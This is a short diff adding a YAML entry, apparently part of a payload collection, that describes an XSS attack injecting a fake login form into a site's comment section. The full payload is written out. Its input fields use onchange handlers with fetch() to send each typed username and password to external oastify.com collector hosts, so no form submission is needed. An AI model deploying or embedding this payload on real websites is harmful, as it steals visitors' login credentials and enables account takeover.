@@ -1,0 +1,18 @@
+name: Using XSS to create a fake login form
+description: This renders a login form in the comment section.
+commands:
+  - command: |
+      <form action=https://3aee9zdfq8rznu4uh7yw5k03hunlbcz1.oastify.com>
+        <input type="username" name="username" placeholder="Username" onchange="javascript:fetch('https://d3ho296pjik9g4x4ahr6yutda4gv4nsc.oastify.com/username?' + this.value, {mode: 'no-cors'})">
+        <input type="password" name="password" placeholder="Password" onchange="javascript:fetch('https://d3ho296pjik9g4x4ahr6yutda4gv4nsc.oastify.com/password?' + this.value, {mode: 'no-cors'})">
+        <input type="submit" name="submit" value="Login">
+      </form>
+    description: No submit is needed because we use the onchange event.
+tags:
+  - xss
+  - csrf
+show:
+links:
+  -
+references:
+  -
